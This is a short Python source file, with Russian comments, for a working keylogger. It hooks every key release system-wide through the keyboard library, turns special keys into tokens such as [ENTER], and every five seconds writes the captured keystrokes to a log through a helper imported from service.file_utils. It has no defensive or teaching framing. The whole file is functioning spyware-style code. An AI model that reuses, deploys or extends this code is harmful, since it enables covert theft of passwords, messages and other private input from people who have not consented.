import keyboard
from threading import Timer
from service.file_utils import write_log

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # Заменим пробелы спец клавиш символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Добавим имя ключа в лог
        self.log += name

    def report(self):
        if self.log:
            # Запись в лог
            write_log("\n" + "Кейлог     " + str(self.log).replace("\n", " "))

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True

        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    Keylogger(interval=5).start()
